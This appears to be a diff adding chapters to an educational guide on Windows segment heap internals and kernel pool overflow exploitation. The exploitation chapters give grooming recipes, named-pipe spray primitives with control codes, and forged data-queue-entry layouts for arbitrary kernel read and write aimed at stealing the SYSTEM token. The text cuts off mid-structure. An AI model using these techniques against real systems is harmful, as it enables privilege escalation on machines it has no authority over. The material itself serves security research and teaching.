+<span class="theme-diagram" style="--diagram-width: 45%">
+  <img class="diagram-light" src="assets/diagrams/light/heap_page_segment.svg" alt="Heap page segment layout">
+  <img class="diagram-dark" src="assets/diagrams/dark/heap_page_segment.svg" alt="Heap page segment layout">
+</span>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ListEntry</code></td><td><code>_LIST_ENTRY</code> (Flink/Blink). Points to the next / previous page segment in the linked list.</td></tr>
+<tr><td><code>Signature</code></td><td>Signature of the page segment used to verify the page segment (encoded, see below).</td></tr>
+<tr><td><code>DescArray[256]</code></td><td>Page range descriptor array. Each element corresponds to one page one-to-one.</td></tr>
+<tr><td><code>Pages</code></td><td>The memory pool of the segment allocator (starts at <code>0x2000</code>).</td></tr>
+</tbody>
+</table>
+</div>
+<div class="admonition warn">
+<p class="admonition-title">Signature</p>
+
+<p><strong>Signature</strong> = <code>Segment ^ SegContext ^ RtlpHpHeapGlobals ^ 0xA2E64EADA2E64EAD</code></p>
+
+</div>
+
+<h3 id="page-range-descriptor"><a class="header" href="#page-range-descriptor">Page Range Descriptor</a></h3>
+<p><code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> is the descriptor for a page. It indicates the status (Allocated or Freed) and information of each page in the page segment, such as whether the page is the beginning of a block or the size of the block. It can be in an allocated or freed state; freed descriptors are stored in <code>FreePageRanges</code>, an rbtree.</p>
+<p><strong>Allocated (block header):</strong></p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>TreeSignature</code></td><td>Signature of the page range descriptor. The value is always <code>0xccddccdd</code>. Only present at the beginning of a block.</td></tr>
+<tr><td><code>UnusedBytes</code></td><td>Unused bytes in an allocated block.</td></tr>
+<tr><td><code>RangeFlag</code></td><td>Indicates the page status (see below).</td></tr>
+<tr><td><code>CommittedPageCount</code></td><td>Number of pages committed in the corresponding block.</td></tr>
+<tr><td><code>Key</code></td><td><code>_HEAP_DESCRIPTOR_KEY</code>. Stores the size of the page corresponding to the descriptor and the number of committed pages.</td></tr>
+</tbody>
+</table>
+</div>
+<span class="theme-diagram" width="65%">
+  <img class="diagram-light" src="assets/diagrams/light/heap_page_range_desc_alloc.svg" alt="Allocated page range descriptor">
+  <img class="diagram-dark" src="assets/diagrams/dark/heap_page_range_desc_alloc.svg" alt="Allocated page range descriptor">
+</span>
+<p><strong>Allocated (not header):</strong> If the page is not the block header, <code>TreeSignature</code> is not meaningful for the block and the <code>Key</code> field’s <code>UnitCount</code> is interpreted as <code>UnitOffset</code>, the offset of the page within the block (used to walk back to the header page).</p>
+<p><strong>Freed:</strong></p>
+<span class="theme-diagram" width="65%">
+  <img class="diagram-light" src="assets/diagrams/light/heap_page_range_desc_free.svg" alt="Freed page range descriptor">
+  <img class="diagram-dark" src="assets/diagrams/dark/heap_page_range_desc_free.svg" alt="Freed page range descriptor">
+</span>
+<p>The freed descriptor is a node of the <code>FreePageRanges</code> rbtree: <code>Left</code> points to a descriptor whose block size is smaller, <code>Right</code> to a descriptor whose block size is greater, and <code>ParentValue</code> points to the parent node (the lowest 1 bit determines whether the parent is encoded). The <code>Key</code> is the same as in the allocated case.</p>
+<h3 id="range-flags"><a class="header" href="#range-flags">Range Flags</a></h3>
+<p><code>RangeFlags</code> indicate page state.</p>
+<p>Important bits from the notes:</p>
+<ul>
+<li>bit 1: allocated</li>
+<li>bit 2: block header</li>
+<li>bit 3: committed</li>
+</ul>
+<p>Allocator interpretation:</p>
+<div class="admonition note">
+<p class="admonition-title">Allocator</p>
+
+<ul>
+<li><strong>LFH</strong>: <code>RangeFlags &amp; 0xc = 8</code></li>
+
+<li><strong>VS</strong>: <code>RangeFlags &amp; 0xc = 0xc</code></li>
+
+</ul>
+
+</div>
+
+<h3 id="descriptor-key"><a class="header" href="#descriptor-key">Descriptor Key</a></h3>
+<pre><code class="language-text">_HEAP_DESCRIPTOR_KEY
+0x0    EncodedCommittedPageCount (2 bytes)
+0x2    LargePageCost (1 byte)
+0x3    UnitCount (1 byte)
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>EncodedCommittedPageCount</code></td><td>The number of pages committed in the block, stored encoded (see below). Only used in the block header.</td></tr>
+<tr><td><code>LargePageCost</code></td><td>Cost of a large page.</td></tr>
+<tr><td><code>UnitCount</code></td><td>The size of the block, in page count.</td></tr>
+</tbody>
+</table>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>CommittedPageCount</strong> = <code>~EncodedCommittedPageCount</code></p>
+
+</div>
+
+<span class="theme-diagram" width="65%">
+  <img class="diagram-light" src="assets/diagrams/light/heap_seg_allocation_diff.svg" alt="VS chunks versus LFH blocks in page segments">
+  <img class="diagram-dark" src="assets/diagrams/dark/heap_seg_allocation_diff.svg" alt="VS chunks versus LFH blocks in page segments">
+</span>
+<h2 id="segcontext"><a class="header" href="#segcontext">SegContext</a></h2>
+<p><code>_HEAP_SEG_CONTEXT</code> is the core structure of the segment allocation. There are two SegContexts in each heap (<code>Size &lt;= 0x7f000</code> and <code>0x7f000 &lt; Size &lt; 0x7f0000</code>).</p>
+<span class="theme-diagram" width="75%">
+  <img class="diagram-light" src="assets/diagrams/light/heap_seg_context.svg" alt="Heap SegContext structure and page segments">
+  <img class="diagram-dark" src="assets/diagrams/dark/heap_seg_context.svg" alt="Heap SegContext structure and page segments">
+</span>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>SegmentMask</code></td><td>A mask used to find the page segment: <code>Page segment = block ptr &amp; SegmentMask</code>. Valued <code>0xfffffffffff00000</code> for the 1 MB segment context.</td></tr>
+<tr><td><code>UnitShift</code></td><td>Used to calculate the index of the page descriptor: <code>Index = block ptr &gt;&gt; UnitShift</code>.</td></tr>
+<tr><td><code>PagesPerUnitShift</code></td><td><code>(1 &lt;&lt; PagesPerUnitShift)</code> indicates the size of a page unit in the SegContext: <code>(1 &lt;&lt; PagesPerUnitShift) * 0x1000</code>. If the value is zero, the page unit is <code>0x1000</code>.</td></tr>
+<tr><td><code>FirstDescriptorIndex</code></td><td>The index of the first page descriptor in the SegContext.</td></tr>
+<tr><td><code>LfhContext</code></td><td>Points to the LFH allocator in the segment heap.</td></tr>
+<tr><td><code>VsContext</code></td><td>Points to the VS allocator in the segment heap.</td></tr>
+<tr><td><code>Heap</code></td><td>Points to the <code>_SEGMENT_HEAP</code> it belongs to.</td></tr>
+<tr><td><code>SegmentListHead</code></td><td><code>_LIST_ENTRY</code>. Points to the page segments in the segment allocator. It is a double linked list with an integrity check.</td></tr>
+<tr><td><code>FreePageRanges</code></td><td><code>_RTL_RB_TREE</code>. Red-black tree of free page ranges (see below).</td></tr>
+</tbody>
+</table>
+</div>
+<p>Example values for the <code>0x1000</code>-unit SegContext:</p>
+<pre><code class="language-text">SegmentMask (0xfffffffffff00000)  Segment = ptr &amp; SegmentMask
+UnitShift (0xc)                   Index = ptr &gt;&gt; 0xc (page index)
+PagesPerUnitShift (0x0)           page unit = 0x1000
+FirstDescriptorIndex (0x2)
+</code></pre>
+<h3 id="freepageranges"><a class="header" href="#freepageranges">FreePageRanges</a></h3>
+<p>After releasing a block, its page descriptor is inserted into the <code>FreePageRanges</code> of the SegContext according to size: if the block size is greater than the node it goes into the right subtree, otherwise into the left subtree. If nothing is greater, the right subtree is NULL (and similarly for the left). There is a node check when a node is taken out of the tree.</p>
+<pre><code class="language-text">FreePageRanges (_RTL_RB_TREE)
+0x0    Root
+0x8    Encoded
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Root</code></td><td>Points to the root of the rbtree.</td></tr>
+<tr><td><code>Encoded</code></td><td>Indicates whether the root has been encoded (default disabled).</td></tr>
+</tbody>
+</table>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>EncodedRoot</strong> = <code>Root ^ FreePageRanges</code></p>
+
+</div>
+
+<h2 id="allocation-mechanism-2"><a class="header" href="#allocation-mechanism-2">Allocation Mechanism</a></h2>
+<span class="theme-diagram" width="60%">
+  <img class="diagram-light" src="assets/diagrams/light/backend_segment_alloc_flow.svg" alt="Backend segment allocation flow">
+  <img class="diagram-dark" src="assets/diagrams/dark/backend_segment_alloc_flow.svg" alt="Backend segment allocation flow">
+</span>
+<p>The main implementation function is <code>nt!RtlpHpSegAlloc</code>, using <code>RtlpHpSegPageRangeAllocate</code> to obtain a freed page descriptor or create a new one:</p>
+<ol>
+<li>Search <code>FreePageRanges</code>, starting from the root; when the required block is larger than the node, continue in the right subtree until found or NULL.</li>
+<li>If no suitable page descriptor is found, allocate a new page segment (<code>RtlpHpSegSegmentAllocate</code>), initialize its first page descriptor (<code>RtlpHpSegSegmentInitialize</code>), and insert it into <code>SegmentListHead</code> (<code>RtlpHpSegHeapAddSegment</code>). In fact only the memory required for the page segment and descriptor structures is allocated; the block part is not allocated at first.</li>
+<li>When a page descriptor is found or created, remove it from <code>FreePageRanges</code>.</li>
+<li>If the required number of pages is smaller than the block, split the block: update the current page descriptor (UnitSize), set the remaining page descriptors (RangeFlag cleared, <code>CommittedPageCount</code>, <code>UnitOffset</code>), and insert the remainder descriptor into <code>FreePageRanges</code>.</li>
+<li>Update the page descriptor fields (<code>RangeFlags</code>, <code>UnitSize</code>, etc.). For example, allocating <code>0x1337</code> as 2 pages marks the header descriptor with <code>RangeFlags = 0x3</code> (First | Allocated) and <code>UnitSize = 0x2</code>, and the second page with <code>RangeFlags = 0x1</code> (Allocated) and <code>UnitOffset = 0x1</code>.</li>
+<li>Check whether all pages in the block are committed: sum the <code>CommittedPageCount</code> of all descriptors in the block; if the block needs committing, commit memory to the specified VA (<code>RtlpHpSegMgrCommit -&gt; RtlpHpAllocVA -&gt; MmAllocatePoolMemory</code>), then update <code>CommittedPageCount</code> of all descriptors in the block.</li>
+<li>Return the block:</li>
+</ol>
+<pre><code class="language-text">Block = (Page descriptor &amp; SegmentMask) + ((index of page descriptor) &lt;&lt; SegContext-&gt;UnitShift)
+</code></pre>
+<h2 id="free-mechanism-2"><a class="header" href="#free-mechanism-2">Free Mechanism</a></h2>
+<span class="theme-diagram" width="60%">
+  <img class="diagram-light" src="assets/diagrams/light/backend_segment_free_flow.svg" alt="Backend segment free flow">
+  <img class="diagram-dark" src="assets/diagrams/dark/backend_segment_free_flow.svg" alt="Backend segment free flow">
+</span>
+<ol>
+<li>Verify that the page segment containing the pointer is legal (<code>RtlpHpSegDescriptorValidate</code>):
+<ul>
+<li>Signature check: <strong><code>0xA2E64EADA2E64EAD == PageSegment ^ SegContext ^ RtlpHpHeapGlobals ^ Signature</code></strong>.</li>
+<li>Verify the page descriptor of the page is Allocated (double-free check).</li>
+</ul>
+</li>
+<li>Recover the structures from the free pointer:
+<ul>
+<li><strong>Page segment</strong> = <code>free pointer &amp; SegmentMask</code></li>
+<li><strong>Page descriptor</strong> = <code>page_segment + 0x20 * ((free pointer - page segment) &gt;&gt; SegContext-&gt;UnitShift)</code></li>
+<li><strong>_HEAP_SEG_CONTEXT</strong> = <code>page_segment ^ page_segment-&gt;Signature ^ 0xA2E64EADA2E64EAD ^ RtlpHpHeapGlobals.HeapKey</code></li>
+</ul>
+</li>
+<li>Check whether the free pointer is at the beginning of a block. If it is not, check the <code>RangeFlag</code> of the page descriptor to decide whether to use the VS allocator or LFH allocator to release the memory; if the free pointer is managed directly by segment allocation, use <code>RtlpHpSegPageRangeShrink</code>.</li>
+<li>Clear the Allocated bit of the page descriptor for the block, then check whether the previous and following blocks are freed; if freed, merge them (<code>RtlpHpSegPageRangeCoalesce</code>):
+<ul>
+<li>To find the previous block, check whether the descriptor of the previous page is the beginning of a block; if not, use the <code>UnitOffset</code> of the previous page’s descriptor to compute the descriptor of the previous block.</li>
+<li>The following block is computed using the <code>UnitCount</code> of the current page descriptor.</li>
+<li>Determine whether the descriptor at the beginning of the block has the Allocated bit set.</li>
+</ul>
+</li>
+<li>If the previous block is free: remove its descriptor from <code>FreePageRanges</code>, clear the first bit of the RangeFlag of the descriptor being freed, update the <code>UnitCount</code> of the previous block’s descriptor, and update the <code>UnitOffset</code> of the last page descriptor after the merge.</li>
+<li>If the following block is free: remove its descriptor from <code>FreePageRanges</code>, clear the first bit of its RangeFlag, update the <code>UnitCount</code> of the descriptor being freed, and update the <code>UnitOffset</code> of the last page descriptor after the merge.</li>
+<li>Finally, insert the (coalesced) free block into <code>FreePageRanges</code> according to its block size.</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="large-block-allocation"><a class="header" href="#large-block-allocation">Large Block Allocation</a></h1>
+<p class="reading-meta">300 words · 1 minute</p>
+
+<p>Large block allocation handles requests above the normal backend segment allocation limit. Compared to the other allocators it is much simpler: it almost directly allocates a large block of memory from the system and stores it in a red-black tree. Release removes it from the tree and returns it to the system directly.</p>
+<h2 id="size-1"><a class="header" href="#size-1">Size</a></h2>
+<p>The large block path is used for requests above the segment context maximum allocation size:</p>
+<pre><code class="language-text">Size &gt; 0x7f0000
+</code></pre>
+<h2 id="structures"><a class="header" href="#structures">Structures</a></h2>
+<p>Relevant structures:</p>
+<ul>
+<li><code>_HEAP_LARGE_ALLOC_DATA</code></li>
+</ul>
+<h3 id="large-alloc-data"><a class="header" href="#large-alloc-data">Large Alloc Data</a></h3>
+<p><code>_HEAP_LARGE_ALLOC_DATA</code> is the metadata node for one large allocation, stored in <code>SegmentHeap-&gt;LargeAllocMetadata</code> and keyed by <code>VirtualAddress</code>.</p>
+<pre><code class="language-text">_HEAP_LARGE_ALLOC_DATA
+0x0    TreeNode (0x18 bytes)   _RTL_BALANCED_NODE
+0x18   VirtualAddress (8 bytes)
+0x20:12 AllocatedPages (52 bits)
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>TreeNode</code></td><td><code>_RTL_BALANCED_NODE</code>: <code>Left</code> points to a node whose <code>VirtualAddress</code> is smaller, <code>Right</code> to a node whose <code>VirtualAddress</code> is greater, and <code>ParentValue</code> points to the parent node.</td></tr>
+<tr><td><code>VirtualAddress</code></td><td>Address of the large block.</td></tr>
+<tr><td><code>AllocatedPages</code></td><td>The number of allocated pages. The lowest 16 bits are used to record unused bytes.</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="allocation-mechanism-3"><a class="header" href="#allocation-mechanism-3">Allocation Mechanism</a></h2>
+<p>The allocation is page-based. The main implementation function is <code>nt!RtlpHpMetadataAlloc</code>:</p>
+<ol>
+<li>Allocate memory to store the large block metadata (<code>_HEAP_LARGE_ALLOC_DATA</code>) using <code>RtlpHpMetadataHeapCtxGet</code> and <code>RtlpHpMetadataHeapStart</code>. These determine which heap to allocate from based on <code>SegmentHeap-&gt;EnvHandle</code>, selecting <code>ExPoolState-&gt;HeapManager.MetadataHeaps[idx]</code>.</li>
+<li>Use <code>RtlpHpAllocVA</code> to allocate the memory, and store the <code>VirtualAddress</code> in the metadata.</li>
+<li>Insert the metadata into <code>SegmentHeap-&gt;LargeAllocMetadata</code>.</li>
+</ol>
+<h2 id="free-mechanism-3"><a class="header" href="#free-mechanism-3">Free Mechanism</a></h2>
+<p>The main implementation function is <code>RtlpHpLargeFree</code>:</p>
+<ol>
+<li>Find the node corresponding to the free pointer in <code>SegmentHeap-&gt;LargeAllocMetadata</code>, and remove the node.</li>
+<li>Use <code>RtlpHpFreeVA</code> to release the memory.</li>
+<li>Release the memory storing the metadata (<code>RtlpHpMetadataFree</code>).</li>
+</ol>
+<p>For exploitation or corruption analysis, keep this path separate from VS and backend segment allocation. The metadata layout and lookup behavior are different.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="exploitation-techniques"><a class="header" href="#exploitation-techniques">Exploitation Techniques</a></h1>
+<p class="reading-meta">863 words · 4 minutes</p>
+
+<p>The techniques in this chapter turn a kernel pool overflow into privilege escalation.</p>
+<h2 id="what-an-overflow-controls"><a class="header" href="#what-an-overflow-controls">What an Overflow Controls</a></h2>
+<p>To revise, a pool overflow overwrites whatever sits right after the vulnerable chunk which depends on the backend:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Backend</th><th>Layout after the chunk</th></tr>
+</thead>
+<tbody>
+<tr><td>LFH</td><td><code>_POOL_HEADER</code> (0x10)</td></tr>
+<tr><td>VS</td><td><code>_HEAP_VS_CHUNK_HEADER</code> (0x10) <strong>+</strong>  <code>_POOL_HEADER</code> (0x10)</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="heap-grooming"><a class="header" href="#heap-grooming">Heap Grooming</a></h2>
+<p>Every technique needs the vulnerable chunk next to a chosen victim, with control over when both are allocated and freed.</p>
+<p>For LFH sizes, spray 32 or more allocations of the exact same size before and after the victim. The allocator picks a block randomly within a 32-block bitmap window, and enough spray defeats that.</p>
+<p>For VS sizes, allocate thousands of same-size chunks to drain <code>FreeChunkTree</code> until a fresh <code>0x10000</code> subsegment appears, then fill it so allocations end up contiguous. Free at most a third of them.</p>
+<p>To pre-enable a Dynamic Lookaside for a size, allocate a few thousand chunks, wait about two seconds for the Balance Set Manager to rebalance, then allocate and wait again. Freed chunks of that size then land in the lookaside instead of going through the backend free path.</p>
+<h2 id="named-pipes"><a class="header" href="#named-pipes">Named Pipes</a></h2>
+<p>Both techniques rely on the Named Pipe File System (<strong>NPFS</strong>, implemented by <code>Npfs.sys</code>). Named pipes are an inter-process communication mechanism with two ends: the <strong>server</strong> (which creates the pipe) and the <strong>client</strong> (which connects to it). When a connection is established, NPFS creates two queues in the connection’s Context Control Block: an input queue (client to server) and an output queue (server to client).</p>
+<h3 id="context-control-block"><a class="header" href="#context-control-block">Context Control Block</a></h3>
+<p>The Context Control Block(CCB) is the “connection object”. It holds all state for one pipe instance: the two queues of pending reads/writes, the pipe configuration (mode, type, quota), etc.</p>
+<pre><code class="language-c">typedef struct _NP_CCB {
+    NODE_TYPE_CODE NodeType;
+    UCHAR NamedPipeState;
+    UCHAR ReadMode[2];
+    UCHAR CompletionMode[2];
+    SECURITY_QUALITY_OF_SERVICE ClientQos;
+    LIST_ENTRY CcbEntry;
+    PNP_FCB Fcb;
+    PFILE_OBJECT FileObject[2];   // [0] = Server, [1] = Client
+    PEPROCESS Process;
+    PVOID ClientSession;
+    PNP_NONPAGED_CCB NonPagedCcb;
+    NP_DATA_QUEUE DataQueue[2];   // [0] = Input, [1] = Output
+    PSECURITY_CLIENT_CONTEXT ClientContext;
+    LIST_ENTRY IrpList;
+} NP_CCB, *PNP_CCB;
+</code></pre>
+<h3 id="data-queue-entries"><a class="header" href="#data-queue-entries">Data Queue Entries</a></h3>
+<span class="theme-diagram" width="90%">
+  <img class="diagram-light" src="assets/diagrams/light/dqe_in_ccb.svg" alt="Buffered vs unbuffered data queue entries">
+  <img class="diagram-dark" src="assets/diagrams/dark/dqe_in_ccb.svg" alt="Buffered vs unbuffered data queue entries">
+</span>
+<p>Each queue holds <code>NP_DATA_QUEUE_ENTRY</code> structures in non-paged pool. Entries are removed from the list when all of their data are read by a client (e.g. using the ReadFile API).</p>
+<pre><code class="language-c">struct DATA_QUEUE_ENTRY {
+    LIST_ENTRY NextEntry;
+    _IRP* Irp;
+    _SECURITY_CLIENT_CONTEXT* SecurityContext;
+    uint32_t EntryType;
+    uint32_t QuotaInEntry;
+    uint32_t DataSize;
+    uint32_t x;
+    char Data[];
+};
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>NextEntry</code></td><td><code>LIST_ENTRY</code>. Doubly-linked list node connecting all queued data entries. The list includes a sentinel node stored in the CCB.</td></tr>
+<tr><td><code>Irp</code></td><td>The IRP associated with the entry. Populated for unbuffered entries, or for buffered entries whose size exceeds the available pipe quota (the stalled write).</td></tr>
+<tr><td><code>SecurityContext</code></td><td>The client security context captured when the entry was written.</td></tr>
+<tr><td><code>EntryType</code></td><td><code>0</code> = buffered, <code>1</code> = unbuffered.</td></tr>
+<tr><td><code>QuotaInEntry</code></td><td>Quota charged to the entry. <code>0</code> for unbuffered entries.</td></tr>
+<tr><td><code>DataSize</code></td><td>Length of user data associated with the entry.</td></tr>
+<tr><td><code>x</code></td><td>Uninitialized, likely padding.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="buffered-vs-unbuffered-entries"><a class="header" href="#buffered-vs-unbuffered-entries">Buffered vs Unbuffered Entries</a></h3>
+<span class="theme-diagram" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/dqe_types.svg" alt="Buffered vs unbuffered data queue entries">
+  <img class="diagram-dark" src="assets/diagrams/dark/dqe_types.svg" alt="Buffered vs unbuffered data queue entries">
+</span>
+<ul>
+<li><strong>Buffered DQE</strong>
+<ul>
+<li>Created by <code>WriteFile</code>.</li>
+<li>The data is copied from user space into a kernel buffer (<code>NP_DATA_QUEUE_ENTRY</code>) immediately.</li>
+<li>Quota: consumes quota based on <code>DataSize</code>. If the pipe quota is full, the write stalls in <code>PIPE_WAIT</code> mode and the entry keeps its IRP until the write completes. As data is read from existing buffered entries, the freed quota is credited to the stalled write’s <code>QuotaInEntry</code> until it reaches <code>DataSize</code>.</li>
+</ul>
+</li>
+<li><strong>Unbuffered DQE</strong>
+<ul>
+<li>Created by <code>NtFsControlFile</code> with <code>FSCTL_PIPE_INTERNAL_WRITE</code> (<code>0x119FF8</code>).</li>
+<li>The data stays in user space! only a pointer to it is stored in the kernel entry (through the IRP’s <code>SystemBuffer</code>).</li>
+<li>Quota: consumes <code>0</code> because the data is not in the pipe’s memory.</li>
+</ul>
+</li>
+</ul>
+<p>Unbuffered entries provide direct control over a chunk’s size and contents. Since there is no <code>DATA_QUEUE_ENTRY</code> header stored in the chunk, the entire chunk can be used to place a fake structure.</p>
+<h3 id="pipe-attributes"><a class="header" href="#pipe-attributes">Pipe Attributes</a></h3>
+<p>After a pipe is created, attributes can be attached to it which are key-value pairs stored in a linked list. Each attribute is a <code>PipeAttribute</code> object, allocated in the PagedPool:</p>
+<pre><code class="language-c">struct PipeAttribute {
+    LIST_ENTRY list;
+    char* AttributeName;
+    uint64_t AttributeValueSize;
+    char* AttributeValue;
+    char data[0];
+};
+</code></pre>
+<ul>
+<li>The allocation size and the data could be controlled by us</li>
+<li><code>AttributeName</code> and <code>AttributeValue</code> point into the <code>data</code> field.</li>
+<li>Attributes are created with <code>NtFsControlFile</code> using control code <code>0x11003C</code>, and an attribute’s value is read back with <code>0x110038</code>, which follows the <code>AttributeValue</code> pointer and returns <code>AttributeValueSize</code> bytes.</li>
+<li>Changing an attribute’s value frees the old <code>PipeAttribute</code> and allocates a new one.</li>
+</ul>
+<p>If the <code>AttributeValue</code> (pointer to attribute) and <code>AttributeValueSize</code> fields can be overwritten, we can then leak kernel memory, giving us an arbitrary read. And since size and data are fully controlled, the object is also a convenient way to plant controlled data in the PagedPool, for example to reallocate a freed chunk.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="data-queue-entries-vp777"><a class="header" href="#data-queue-entries-vp777">Data Queue Entries (vp777)</a></h1>
+<p class="reading-meta">1229 words · 6 minutes</p>
+
+<p><strong>Idea</strong> : After spraying and grooming the pool we could use the overflow to rewrite the header of the <code>NP_DATA_QUEUE_ENTRY</code> sitting next to the vulnerable chunk, and the forged header turns that into arbitrary read and write.</p>
+<h2 id="1-arbitrary-read-using-unbuffered-entries"><a class="header" href="#1-arbitrary-read-using-unbuffered-entries">1. Arbitrary Read Using Unbuffered Entries</a></h2>
+<p>Works when the overflow lets you fully control the bytes written past the chunk and you already know the address you want to read.</p>
+<span class="theme-diagram" width="60%">
+  <img class="diagram-light" src="assets/diagrams/light/dqe_arb_read1.svg" alt="Arbitrary read using unbuffered entries">
+  <img class="diagram-dark" src="assets/diagrams/dark/dqe_arb_read1.svg" alt="Arbitrary read using unbuffered entries">
+</span>
+<p>Forge an unbuffered entry whose <code>Irp</code> points at a forged IRP with <code>SystemBuffer</code> set to the kernel address to read from:</p>
+<pre><code class="language-c">DATA_QUEUE_ENTRY:
+    NextEntry = whatever;
+    Irp = Forged IRP Address;   // can be a userspace address if SMAP is absent
+    SecurityContext = 0;
+    EntryType = 1;              // unbuffered
+    QuotaInEntry = 0;
+    DataSize = arbitrary read size;
+
+IRP-&gt;SystemBuffer = kernel address to read from;
+</code></pre>
+<p>Reading <code>DataSize</code> bytes from the pipe copies them from wherever <code>IRP-&gt;SystemBuffer</code> points.</p>
+<h2 id="2-arbitrary-read-using-buffered-entries"><a class="header" href="#2-arbitrary-read-using-buffered-entries">2. Arbitrary Read Using Buffered Entries</a></h2>
+<p>Before you know any address, there is nothing to point a forged IRP at. This variant makes use of the pool overflow to rewrite the DQE <code>DataSize</code> field of a buffered entry with a bigger value so that it reads past the entry’s real data into whatever sits behind it.</p>
+<span class="theme-diagram" width="40%">
+  <img class="diagram-light" src="assets/diagrams/light/dqe_arb_read2.svg" alt="Arbitrary read using buffered entries">
+  <img class="diagram-dark" src="assets/diagrams/dark/dqe_arb_read2.svg" alt="Arbitrary read using buffered entries">
+</span>
+<pre><code class="language-c">DATA_QUEUE_ENTRY:
+    NextEntry = whatever;
+    Irp = 0;
+    SecurityContext = 0;
+    EntryType = 0;              // buffered
+    QuotaInEntry = 0;
+    DataSize = something bigger than the original size;
+</code></pre>
+<p>This technique can be used to leak pointers/heap metadata and other interesting data that could be found after our DATA_QUEUE_ENTRY.</p>
+<h2 id="3-arbitrary-read-with-limited-control-flink-only"><a class="header" href="#3-arbitrary-read-with-limited-control-flink-only">3. Arbitrary Read with Limited Control (Flink Only)</a></h2>
+<p>Some overflows only let you write a few bytes, or the bytes are not yours to choose (a <code>memset</code> with fixed values, for example). Then the best you can do is overwrite the <code>Flink</code> of a victim entry and point it at data you control, an “undercover” DQE, and run the reads above through it.</p>
+<span class="theme-diagram diagram-lg" width="85%">
+  <img class="diagram-light" src="assets/diagrams/light/dqe_arb_read3.svg" alt="Arbitrary read with limited Flink control">
+  <img class="diagram-dark" src="assets/diagrams/dark/dqe_arb_read3.svg" alt="Arbitrary read with limited Flink control">
+</span>
+<p><em>In the diagram, “Babushka” refers to a Russian nesting doll ie. one object contains another object of the same kind.
+So the core idea is be to create a babushka DQE such that its data contains another DQE(“undercover” DQE here)</em></p>
+<ul>
+<li>The victim entry’s <code>Flink</code> now points to the undercover DQE, which is composed of user-controlled data.</li>
+<li><code>DataSize1</code> = undercover header + <code>DataSize2</code>, and <code>DataSize2</code> = <code>DataSize1</code> - undercover header.</li>
+<li><code>DataSize2</code> should be at least <code>DataSize1-sizeof(DATA_QUEUE_ENTRY)+n</code> to read n bytes from the adjacent memory/chunk.</li>
+<li>To read <code>n</code> bytes from chunk 2: read <code>DataSize + DataSize1 - sizeof(DATA_QUEUE_ENTRY) + n</code>.</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">PeekNamedPipe</p>
+
+<p>Since Windows 7, <code>LIST_ENTRY</code> unlinking validates <code>entry-&gt;Flink-&gt;Blink == entry</code> (<em>safe-unlink</em>). Reading <code>DataSize</code> bytes causes the overflowed <code>DATA_QUEUE_ENTRY</code> to be unlinked, and the corrupted pointers trigger a bugcheck. <code>PeekNamedPipe</code> avoids this by walking the queue without unlinking entries, allowing the undercover <code>DATA_QUEUE_ENTRY</code> to be activated without triggering safe-unlink.</p>
+
+</div>
+
+<p>The practical flow:</p>
+<ol>
+<li>Groom the pool so the redirected <code>Flink</code> lands on the undercover DQE.</li>
+<li>Overflow the victim’s <code>Flink</code>.</li>
+<li>Use <code>PeekNamedPipe</code> with a small size to activate the undercover DQE and leak adjacent pool memory (ASLR bypass).</li>
+<li>Modify the contents of the specified userspace address to hold a forged <code>DATA_QUEUE_ENTRY</code> that facilitates the arbitrary read.</li>
+<li>Use <code>PeekNamedPipe</code> with size = <code>DataSize + DataSize2 + n</code> to leak <code>n</code> bytes from the address set in the <code>SystemBuffer</code> of the IRP.</li>
+</ol>
+<h2 id="4-arbitrary-write"><a class="header" href="#4-arbitrary-write">4. Arbitrary Write</a></h2>
+<p>At this point we can read kernel memory but not change it. Now we want to modify our own process token to elevate privileges from low integrity. The classic move is copying the SYSTEM process token over our own.</p>
+<p>The write comes from the quota mechanism ie. when a buffered write exceeds the pipe quota in blocking mode, the entry waits in the queue as a stalled write with <code>QuotaInEntry &lt; DataSize</code>, holding its IRP. Every read frees quota, <code>QuotaInEntry</code> climbs back up, and once it reaches <code>DataSize</code>, npfs completes the IRP through <code>IofCompleteRequest</code>. An entry forged to look like a stalled write therefore decides which IRP gets completed, and the IRP decides where the write lands: its <code>AssociatedIrp</code> holds the source address to copy from and its <code>UserBuffer</code> holds the destination to overwrite.</p>
+<p>Say the pipe quota is <code>0x1000</code> bytes and it is already full. A <code>WriteFile</code> of <code>0x800</code> bytes cannot fit, so npfs queues it with <code>QuotaInEntry = 0</code> and parks the write IRP. Reading <code>0x200</code> bytes from the other end frees <code>0x200</code> of quota, and that credit goes to the stalled write, so <code>QuotaInEntry</code> becomes <code>0x200</code>. Once enough reads bring <code>QuotaInEntry</code> up to <code>0x800</code> (the write’s <code>DataSize</code>), npfs decides there is finally room and completes the pending IRP. The write only “finishes” when the queue has room for it.</p>
+<p>The forged entry abuses exactly this bookkeeping:</p>
+<pre><code class="language-c">DATA_QUEUE_ENTRY:
+    NextEntry.Flink = accessible address;
